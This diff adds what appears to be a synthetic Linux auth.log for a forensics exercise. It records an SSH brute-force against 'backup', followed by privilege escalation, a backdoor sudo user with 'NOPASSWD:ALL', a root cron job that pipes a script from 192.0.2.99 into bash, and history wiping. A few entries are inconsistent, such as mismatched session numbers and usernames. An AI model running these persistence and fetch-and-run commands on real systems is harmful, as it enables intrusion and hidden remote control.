@@ -1,0 +1,260 @@
+Mar 09 06:10:00 webserver01 CRON[1005]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 06:28:00 webserver01 CRON[1007]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 07:05:00 webserver01 CRON[1014]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 07:10:00 webserver01 CRON[1018]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 07:27:00 webserver01 sshd[1019]: Accepted publickey for aritra from 203.0.113.7 port 57856 ssh2: RSA SHA256:9fK2j...
+Mar 09 07:27:00 webserver01 sshd[1019]: pam_unix(sshd:session): session opened for user aritra by (uid=0)
+Mar 09 07:56:00 webserver01 CRON[1024]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 07:59:00 webserver01 systemd-logind[612]: New session 814 of user deploy.
+Mar 09 08:23:00 webserver01 CRON[1031]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 08:47:00 webserver01 CRON[1038]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 08:56:00 webserver01 sudo: aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+Mar 09 09:01:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 09:11:00 webserver01 systemd-logind[612]: New session 180 of user aritra.
+Mar 09 09:32:00 webserver01 systemd-logind[612]: New session 691 of user ubuntu.
+Mar 09 09:39:00 webserver01 CRON[1070]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 10:00:00 webserver01 systemd-logind[612]: New session 987 of user ubuntu.
+Mar 09 10:27:00 webserver01 CRON[1080]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 10:40:00 webserver01 sudo: aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+Mar 09 10:47:00 webserver01 sshd[1087]: pam_unix(sshd:session): session closed for user aritra
+Mar 09 11:05:00 webserver01 CRON[1094]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 11:25:00 webserver01 systemd-logind[612]: New session 324 of user aritra.
+Mar 09 11:48:00 webserver01 systemd-logind[612]: New session 334 of user ubuntu.
+Mar 09 12:11:00 webserver01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+Mar 09 12:27:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 12:59:00 webserver01 CRON[1116]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 13:17:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 13:36:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 14:16:00 webserver01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/df -h
+Mar 09 14:24:00 webserver01 systemd-logind[612]: New session 256 of user aritra.
+Mar 09 14:37:00 webserver01 systemd-logind[612]: New session 710 of user ubuntu.
+Mar 09 15:04:00 webserver01 sudo: aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+Mar 09 15:42:00 webserver01 systemd-logind[612]: New session 796 of user aritra.
+Mar 09 15:52:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 16:12:00 webserver01 systemd-logind[612]: New session 214 of user deploy.
+Mar 09 16:42:00 webserver01 CRON[1170]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 17:01:00 webserver01 systemd-logind[612]: New session 619 of user ubuntu.
+Mar 09 17:23:00 webserver01 systemd-logind[612]: New session 723 of user ubuntu.
+Mar 09 17:35:00 webserver01 sudo: aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Mar 09 17:58:00 webserver01 sshd[1187]: Accepted publickey for deploy from 203.0.113.22 port 47846 ssh2: RSA SHA256:9fK2j...
+Mar 09 17:58:00 webserver01 sshd[1187]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Mar 09 18:04:00 webserver01 CRON[1189]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 18:12:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 18:49:00 webserver01 systemd-logind[612]: New session 775 of user deploy.
+Mar 09 19:27:00 webserver01 CRON[1203]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 19:57:00 webserver01 systemd-logind[612]: New session 873 of user aritra.
+Mar 09 20:12:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 20:38:00 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Mar 09 20:56:00 webserver01 CRON[1234]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 21:00:00 webserver01 sshd[1238]: pam_unix(sshd:session): session closed for user aritra
+Mar 09 21:17:00 webserver01 CRON[1239]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 21:34:00 webserver01 CRON[1240]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 21:58:00 webserver01 CRON[1244]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 22:18:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 22:55:00 webserver01 CRON[1256]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 09 23:13:00 webserver01 systemd-logind[612]: New session 294 of user ubuntu.
+Mar 09 23:22:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 09 23:52:00 webserver01 sudo: aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Mar 10 03:14:02 webserver01 sshd[1398]: Invalid user database from 198.51.100.23 port 42400
+Mar 10 03:14:02 webserver01 sshd[1398]: input_userauth_request: invalid user database [preauth]
+Mar 10 03:14:02 webserver01 sshd[1398]: Failed password for invalid user database from 198.51.100.23 port 42400 ssh2
+Mar 10 03:14:35 webserver01 sshd[1407]: Invalid user postgres from 198.51.100.23 port 48690
+Mar 10 03:14:35 webserver01 sshd[1407]: input_userauth_request: invalid user postgres [preauth]
+Mar 10 03:14:35 webserver01 sshd[1407]: Failed password for invalid user postgres from 198.51.100.23 port 48690 ssh2
+Mar 10 03:15:17 webserver01 sshd[1409]: Invalid user pi from 198.51.100.23 port 48004
+Mar 10 03:15:17 webserver01 sshd[1409]: input_userauth_request: invalid user pi [preauth]
+Mar 10 03:15:17 webserver01 sshd[1409]: Failed password for invalid user pi from 198.51.100.23 port 48004 ssh2
+Mar 10 03:15:55 webserver01 sshd[1412]: Invalid user database from 198.51.100.23 port 54358
+Mar 10 03:15:55 webserver01 sshd[1412]: input_userauth_request: invalid user database [preauth]
+Mar 10 03:15:55 webserver01 sshd[1412]: Failed password for invalid user database from 198.51.100.23 port 54358 ssh2
+Mar 10 03:16:34 webserver01 sshd[1421]: Invalid user database from 198.51.100.23 port 40256
+Mar 10 03:16:34 webserver01 sshd[1421]: input_userauth_request: invalid user database [preauth]
+Mar 10 03:16:34 webserver01 sshd[1421]: Failed password for invalid user database from 198.51.100.23 port 40256 ssh2
+Mar 10 03:17:13 webserver01 sshd[1423]: Invalid user support from 198.51.100.23 port 44400
+Mar 10 03:17:13 webserver01 sshd[1423]: input_userauth_request: invalid user support [preauth]
+Mar 10 03:17:13 webserver01 sshd[1423]: Failed password for invalid user support from 198.51.100.23 port 44400 ssh2
+Mar 10 03:17:40 webserver01 sshd[1425]: Invalid user postgres from 198.51.100.23 port 58128
+Mar 10 03:17:40 webserver01 sshd[1425]: input_userauth_request: invalid user postgres [preauth]
+Mar 10 03:17:40 webserver01 sshd[1425]: Failed password for invalid user postgres from 198.51.100.23 port 58128 ssh2
+Mar 10 03:18:17 webserver01 sshd[1430]: Invalid user user from 198.51.100.23 port 59819
+Mar 10 03:18:17 webserver01 sshd[1430]: input_userauth_request: invalid user user [preauth]
+Mar 10 03:18:17 webserver01 sshd[1430]: Failed password for invalid user user from 198.51.100.23 port 59819 ssh2
+Mar 10 03:18:58 webserver01 sshd[1434]: Invalid user support from 198.51.100.23 port 60782
+Mar 10 03:18:58 webserver01 sshd[1434]: input_userauth_request: invalid user support [preauth]
+Mar 10 03:18:58 webserver01 sshd[1434]: Failed password for invalid user support from 198.51.100.23 port 60782 ssh2
+Mar 10 03:19:50 webserver01 sshd[1442]: Invalid user admin from 198.51.100.23 port 48228
+Mar 10 03:19:50 webserver01 sshd[1442]: input_userauth_request: invalid user admin [preauth]
+Mar 10 03:19:50 webserver01 sshd[1442]: Failed password for invalid user admin from 198.51.100.23 port 48228 ssh2
+Mar 10 03:20:15 webserver01 sshd[1449]: Invalid user admin from 198.51.100.23 port 49066
+Mar 10 03:20:15 webserver01 sshd[1449]: input_userauth_request: invalid user admin [preauth]
+Mar 10 03:20:15 webserver01 sshd[1449]: Failed password for invalid user admin from 198.51.100.23 port 49066 ssh2
+Mar 10 03:20:35 webserver01 sshd[1455]: Invalid user support from 198.51.100.23 port 44286
+Mar 10 03:20:35 webserver01 sshd[1455]: input_userauth_request: invalid user support [preauth]
+Mar 10 03:20:35 webserver01 sshd[1455]: Failed password for invalid user support from 198.51.100.23 port 44286 ssh2
+Mar 10 03:21:05 webserver01 sshd[1463]: Invalid user www-data from 198.51.100.23 port 58077
+Mar 10 03:21:05 webserver01 sshd[1463]: input_userauth_request: invalid user www-data [preauth]
+Mar 10 03:21:05 webserver01 sshd[1463]: Failed password for invalid user www-data from 198.51.100.23 port 58077 ssh2
+Mar 10 03:22:00 webserver01 sshd[1464]: Invalid user test from 198.51.100.23 port 43665
+Mar 10 03:22:00 webserver01 sshd[1464]: input_userauth_request: invalid user test [preauth]
+Mar 10 03:22:00 webserver01 sshd[1464]: Failed password for invalid user test from 198.51.100.23 port 43665 ssh2
+Mar 10 03:22:29 webserver01 sshd[1473]: Invalid user pi from 198.51.100.23 port 41180
+Mar 10 03:22:29 webserver01 sshd[1473]: input_userauth_request: invalid user pi [preauth]
+Mar 10 03:22:29 webserver01 sshd[1473]: Failed password for invalid user pi from 198.51.100.23 port 41180 ssh2
+Mar 10 03:23:26 webserver01 sshd[1482]: Invalid user www-data from 198.51.100.23 port 44852
+Mar 10 03:23:26 webserver01 sshd[1482]: input_userauth_request: invalid user www-data [preauth]
+Mar 10 03:23:26 webserver01 sshd[1482]: Failed password for invalid user www-data from 198.51.100.23 port 44852 ssh2
+Mar 10 03:23:26 webserver01 sshd[1482]: Disconnecting authenticating user postgres 198.51.100.23 port 44852: Too many authentication failures [preauth]
+Mar 10 03:23:48 webserver01 sshd[1487]: Invalid user admin from 198.51.100.23 port 51948
+Mar 10 03:23:48 webserver01 sshd[1487]: input_userauth_request: invalid user admin [preauth]
+Mar 10 03:23:48 webserver01 sshd[1487]: Failed password for invalid user admin from 198.51.100.23 port 51948 ssh2
+Mar 10 03:24:30 webserver01 sshd[1491]: Invalid user oracle from 198.51.100.23 port 48176
+Mar 10 03:24:30 webserver01 sshd[1491]: input_userauth_request: invalid user oracle [preauth]
+Mar 10 03:24:30 webserver01 sshd[1491]: Failed password for invalid user oracle from 198.51.100.23 port 48176 ssh2
+Mar 10 03:25:12 webserver01 sshd[1500]: Invalid user postgres from 198.51.100.23 port 53316
+Mar 10 03:25:12 webserver01 sshd[1500]: input_userauth_request: invalid user postgres [preauth]
+Mar 10 03:25:12 webserver01 sshd[1500]: Failed password for invalid user postgres from 198.51.100.23 port 53316 ssh2
+Mar 10 03:25:47 webserver01 sshd[1503]: Invalid user www-data from 198.51.100.23 port 45801
+Mar 10 03:25:47 webserver01 sshd[1503]: input_userauth_request: invalid user www-data [preauth]
+Mar 10 03:25:47 webserver01 sshd[1503]: Failed password for invalid user www-data from 198.51.100.23 port 45801 ssh2
+Mar 10 03:26:08 webserver01 sshd[1506]: Invalid user www-data from 198.51.100.23 port 50885
+Mar 10 03:26:08 webserver01 sshd[1506]: input_userauth_request: invalid user www-data [preauth]
+Mar 10 03:26:08 webserver01 sshd[1506]: Failed password for invalid user www-data from 198.51.100.23 port 50885 ssh2
+Mar 10 03:26:43 webserver01 sshd[1511]: Invalid user oracle from 198.51.100.23 port 45216
+Mar 10 03:26:43 webserver01 sshd[1511]: input_userauth_request: invalid user oracle [preauth]
+Mar 10 03:26:43 webserver01 sshd[1511]: Failed password for invalid user oracle from 198.51.100.23 port 45216 ssh2
+Mar 10 03:27:27 webserver01 sshd[1512]: Invalid user info from 198.51.100.23 port 55423
+Mar 10 03:27:27 webserver01 sshd[1512]: input_userauth_request: invalid user info [preauth]
+Mar 10 03:27:27 webserver01 sshd[1512]: Failed password for invalid user info from 198.51.100.23 port 55423 ssh2
+Mar 10 03:27:59 webserver01 sshd[1520]: Invalid user git from 198.51.100.23 port 51457
+Mar 10 03:27:59 webserver01 sshd[1520]: input_userauth_request: invalid user git [preauth]
+Mar 10 03:27:59 webserver01 sshd[1520]: Failed password for invalid user git from 198.51.100.23 port 51457 ssh2
+Mar 10 03:28:33 webserver01 sshd[1524]: Invalid user user from 198.51.100.23 port 40775
+Mar 10 03:28:33 webserver01 sshd[1524]: input_userauth_request: invalid user user [preauth]
+Mar 10 03:28:33 webserver01 sshd[1524]: Failed password for invalid user user from 198.51.100.23 port 40775 ssh2
+Mar 10 03:29:18 webserver01 sshd[1530]: Invalid user test from 198.51.100.23 port 49129
+Mar 10 03:29:18 webserver01 sshd[1530]: input_userauth_request: invalid user test [preauth]
+Mar 10 03:29:18 webserver01 sshd[1530]: Failed password for invalid user test from 198.51.100.23 port 49129 ssh2
+Mar 10 03:29:55 webserver01 sshd[1536]: Invalid user backup from 198.51.100.23 port 56692
+Mar 10 03:29:55 webserver01 sshd[1536]: input_userauth_request: invalid user backup [preauth]
+Mar 10 03:29:55 webserver01 sshd[1536]: Failed password for invalid user backup from 198.51.100.23 port 56692 ssh2
+Mar 10 03:30:49 webserver01 sshd[1542]: Invalid user oracle from 198.51.100.23 port 40904
+Mar 10 03:30:49 webserver01 sshd[1542]: input_userauth_request: invalid user oracle [preauth]
+Mar 10 03:30:49 webserver01 sshd[1542]: Failed password for invalid user oracle from 198.51.100.23 port 40904 ssh2
+Mar 10 03:31:25 webserver01 sshd[1545]: Invalid user support from 198.51.100.23 port 59024
+Mar 10 03:31:25 webserver01 sshd[1545]: input_userauth_request: invalid user support [preauth]
+Mar 10 03:31:25 webserver01 sshd[1545]: Failed password for invalid user support from 198.51.100.23 port 59024 ssh2
+Mar 10 03:31:47 webserver01 sshd[1547]: Invalid user www-data from 198.51.100.23 port 59548
+Mar 10 03:31:47 webserver01 sshd[1547]: input_userauth_request: invalid user www-data [preauth]
+Mar 10 03:31:47 webserver01 sshd[1547]: Failed password for invalid user www-data from 198.51.100.23 port 59548 ssh2
+Mar 10 03:32:29 webserver01 sshd[1553]: Invalid user sysadmin from 198.51.100.23 port 54299
+Mar 10 03:32:29 webserver01 sshd[1553]: input_userauth_request: invalid user sysadmin [preauth]
+Mar 10 03:32:29 webserver01 sshd[1553]: Failed password for invalid user sysadmin from 198.51.100.23 port 54299 ssh2
+Mar 10 03:32:29 webserver01 sshd[1553]: Disconnecting authenticating user oracle 198.51.100.23 port 54299: Too many authentication failures [preauth]
+Mar 10 03:33:13 webserver01 sshd[1557]: Invalid user admin from 198.51.100.23 port 48346
+Mar 10 03:33:13 webserver01 sshd[1557]: input_userauth_request: invalid user admin [preauth]
+Mar 10 03:33:13 webserver01 sshd[1557]: Failed password for invalid user admin from 198.51.100.23 port 48346 ssh2
+Mar 10 03:34:00 webserver01 sshd[1558]: Invalid user database from 198.51.100.23 port 57036
+Mar 10 03:34:00 webserver01 sshd[1558]: input_userauth_request: invalid user database [preauth]
+Mar 10 03:34:00 webserver01 sshd[1558]: Failed password for invalid user database from 198.51.100.23 port 57036 ssh2
+Mar 10 03:34:32 webserver01 sshd[1564]: Invalid user test from 198.51.100.23 port 54132
+Mar 10 03:34:32 webserver01 sshd[1564]: input_userauth_request: invalid user test [preauth]
+Mar 10 03:34:32 webserver01 sshd[1564]: Failed password for invalid user test from 198.51.100.23 port 54132 ssh2
+Mar 10 03:35:13 webserver01 sshd[1570]: Invalid user git from 198.51.100.23 port 44083
+Mar 10 03:35:13 webserver01 sshd[1570]: input_userauth_request: invalid user git [preauth]
+Mar 10 03:35:13 webserver01 sshd[1570]: Failed password for invalid user git from 198.51.100.23 port 44083 ssh2
+Mar 10 03:36:05 webserver01 sshd[1575]: Invalid user vagrant from 198.51.100.23 port 53382
+Mar 10 03:36:05 webserver01 sshd[1575]: input_userauth_request: invalid user vagrant [preauth]
+Mar 10 03:36:05 webserver01 sshd[1575]: Failed password for invalid user vagrant from 198.51.100.23 port 53382 ssh2
+Mar 10 03:36:50 webserver01 sshd[1580]: Invalid user postgres from 198.51.100.23 port 58166
+Mar 10 03:36:50 webserver01 sshd[1580]: input_userauth_request: invalid user postgres [preauth]
+Mar 10 03:36:50 webserver01 sshd[1580]: Failed password for invalid user postgres from 198.51.100.23 port 58166 ssh2
+Mar 10 03:37:22 webserver01 sshd[1587]: Invalid user guest from 198.51.100.23 port 52423
+Mar 10 03:37:22 webserver01 sshd[1587]: input_userauth_request: invalid user guest [preauth]
+Mar 10 03:37:22 webserver01 sshd[1587]: Failed password for invalid user guest from 198.51.100.23 port 52423 ssh2
+Mar 10 03:38:21 webserver01 sshd[1592]: Failed password for backup from 198.51.100.23 port 53306 ssh2
+Mar 10 03:39:16 webserver01 sshd[1593]: Failed password for backup from 198.51.100.23 port 49957 ssh2
+Mar 10 03:39:54 webserver01 sshd[1597]: Failed password for backup from 198.51.100.23 port 54086 ssh2
+Mar 10 03:40:51 webserver01 sshd[1603]: Failed password for backup from 198.51.100.23 port 55236 ssh2
+Mar 10 03:41:39 webserver01 sshd[1611]: Failed password for backup from 198.51.100.23 port 47002 ssh2
+Mar 10 03:42:31 webserver01 sshd[1619]: Failed password for backup from 198.51.100.23 port 45560 ssh2
+Mar 10 03:42:56 webserver01 sshd[1624]: Failed password for backup from 198.51.100.23 port 56890 ssh2
+Mar 10 03:43:56 webserver01 sshd[1630]: Failed password for backup from 198.51.100.23 port 43060 ssh2
+Mar 10 03:45:16 webserver01 sshd[1635]: Accepted password for backup from 198.51.100.23 port 47361 ssh2
+Mar 10 03:45:16 webserver01 sshd[1635]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+Mar 10 03:45:16 webserver01 systemd-logind[612]: New session 925 of user backup.
+Mar 10 03:45:36 webserver01 sudo: backup : TTY=pts/2 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/id
+Mar 10 03:45:41 webserver01 sudo: backup : TTY=pts/2 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/cat /etc/sudoers
+Mar 10 03:46:21 webserver01 sudo: backup : TTY=pts/2 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash
+Mar 10 03:46:21 webserver01 sudo: pam_unix(sudo:session): session opened for user root by backup(uid=1001)
+Mar 10 03:47:11 webserver01 useradd[1639]: new group: name=sysupdate, GID=1002
+Mar 10 03:47:11 webserver01 useradd[1639]: new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/bash
+Mar 10 03:47:19 webserver01 passwd[1642]: pam_unix(passwd:chauthtok): password changed for sysupdate
+Mar 10 03:47:31 webserver01 sudo: backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysupdate
+Mar 10 03:47:46 webserver01 sudo: backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c "echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+Mar 10 03:48:16 webserver01 sudo: backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -l
+Mar 10 03:48:26 webserver01 sudo: backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c "(crontab -l; echo '*/10 * * * * curl -s http://192.0.2.99/update.sh | bash') | crontab -"
+Mar 10 03:48:51 webserver01 sudo: backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c "echo > /home/backup/.bash_history"
+Mar 10 03:48:59 webserver01 sudo: backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/history -c
+Mar 10 03:49:19 webserver01 sshd[1635]: pam_unix(sshd:session): session closed for user backup
+Mar 10 03:49:19 webserver01 systemd-logind[612]: Session 125 logged out. Waiting for processes to exit.
+Mar 10 06:03:19 webserver01 sshd[1643]: Accepted password for sysupdate from 198.51.100.23 port 48023 ssh2
+Mar 10 06:03:19 webserver01 sshd[1643]: pam_unix(sshd:session): session opened for user sysupdate by (uid=0)
+Mar 10 06:33:19 webserver01 sshd[1643]: pam_unix(sshd:session): session closed for user sysupdate
+Mar 10 07:06:00 webserver01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 10 07:21:00 webserver01 CRON[1284]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 07:32:00 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 10 07:39:00 webserver01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Mar 10 08:16:00 webserver01 systemd-logind[612]: New session 871 of user ubuntu.
+Mar 10 08:29:00 webserver01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/df -h
+Mar 10 08:35:00 webserver01 CRON[1309]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 09:02:00 webserver01 CRON[1317]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 09:23:00 webserver01 sudo: aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/df -h
+Mar 10 09:35:00 webserver01 CRON[1330]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 09:41:00 webserver01 sshd[1339]: pam_unix(sshd:session): session closed for user ubuntu
+Mar 10 10:04:00 webserver01 CRON[1347]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 10:39:00 webserver01 systemd-logind[612]: New session 261 of user ubuntu.
+Mar 10 11:14:00 webserver01 CRON[1359]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 11:21:00 webserver01 sshd[1363]: pam_unix(sshd:session): session closed for user deploy
+Mar 10 11:31:00 webserver01 systemd-logind[612]: New session 692 of user aritra.
+Mar 10 11:36:00 webserver01 sshd[1374]: pam_unix(sshd:session): session closed for user aritra
+Mar 10 12:10:00 webserver01 sshd[1394]: Failed password for root from 198.51.100.23 port 54982 ssh2
+Mar 10 12:16:00 webserver01 sshd[1380]: pam_unix(sshd:session): session closed for user deploy
+Mar 10 12:32:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 10 12:40:00 webserver01 sshd[1396]: Failed password for admin from 198.51.100.23 port 40305 ssh2
+Mar 10 12:50:00 webserver01 CRON[1389]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 17:07:00 webserver01 sshd[1647]: Accepted publickey for aritra from 203.0.113.22 port 56199 ssh2: RSA SHA256:9fK2j...
+Mar 10 17:07:00 webserver01 sshd[1647]: pam_unix(sshd:session): session opened for user aritra by (uid=0)
+Mar 10 17:35:00 webserver01 CRON[1648]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 17:44:00 webserver01 systemd-logind[612]: New session 280 of user aritra.
+Mar 10 18:20:00 webserver01 sshd[1661]: Accepted publickey for ubuntu from 203.0.113.7 port 54957 ssh2: RSA SHA256:9fK2j...
+Mar 10 18:20:00 webserver01 sshd[1661]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Mar 10 18:31:00 webserver01 systemd-logind[612]: New session 672 of user aritra.
+Mar 10 18:54:00 webserver01 systemd-logind[612]: New session 727 of user aritra.
+Mar 10 19:29:00 webserver01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 10 20:02:00 webserver01 sshd[1691]: Accepted publickey for aritra from 203.0.113.22 port 57081 ssh2: RSA SHA256:9fK2j...
+Mar 10 20:02:00 webserver01 sshd[1691]: pam_unix(sshd:session): session opened for user aritra by (uid=0)
+Mar 10 20:36:00 webserver01 sshd[1696]: pam_unix(sshd:session): session closed for user deploy
+Mar 10 20:43:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 10 21:03:00 webserver01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 10 21:15:00 webserver01 CRON[1712]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 21:31:00 webserver01 CRON[1719]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 10 21:55:00 webserver01 sshd[1726]: Accepted publickey for ubuntu from 203.0.113.7 port 53767 ssh2: RSA SHA256:9fK2j...
+Mar 10 21:55:00 webserver01 sshd[1726]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Mar 10 22:22:00 webserver01 systemd-logind[612]: New session 977 of user aritra.
+Mar 10 22:49:00 webserver01 sshd[1733]: Accepted publickey for deploy from 203.0.113.22 port 53730 ssh2: RSA SHA256:9fK2j...
+Mar 10 22:49:00 webserver01 sshd[1733]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Mar 10 23:26:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 10 23:43:00 webserver01 sshd[1747]: Accepted publickey for deploy from 203.0.113.22 port 40951 ssh2: RSA SHA256:9fK2j...
+Mar 10 23:43:00 webserver01 sshd[1747]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Mar 11 00:10:00 webserver01 sudo: aritra : TTY=pts/0 ; PWD=/home/aritra ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 11 00:42:00 webserver01 systemd-logind[612]: New session 127 of user deploy.
+Mar 11 01:22:00 webserver01 sshd[1764]: pam_unix(sshd:session): session closed for user ubuntu
+Mar 11 01:52:00 webserver01 CRON[1772]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 11 02:06:00 webserver01 CRON[1779]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 11 02:29:00 webserver01 CRON[1785]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 11 02:53:00 webserver01 systemd-logind[612]: New session 384 of user deploy.
+Mar 11 03:12:00 webserver01 systemd-logind[612]: New session 119 of user aritra.
+Mar 11 03:49:00 webserver01 CRON[1806]: (root) CMD (/usr/bin/certbot renew --quiet)
+Mar 11 04:06:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Mar 11 04:10:00 webserver01 systemd-logind[612]: New session 959 of user ubuntu.
+Mar 11 04:22:00 webserver01 CRON[1819]: (root) CMD (/usr/bin/certbot renew --quiet)
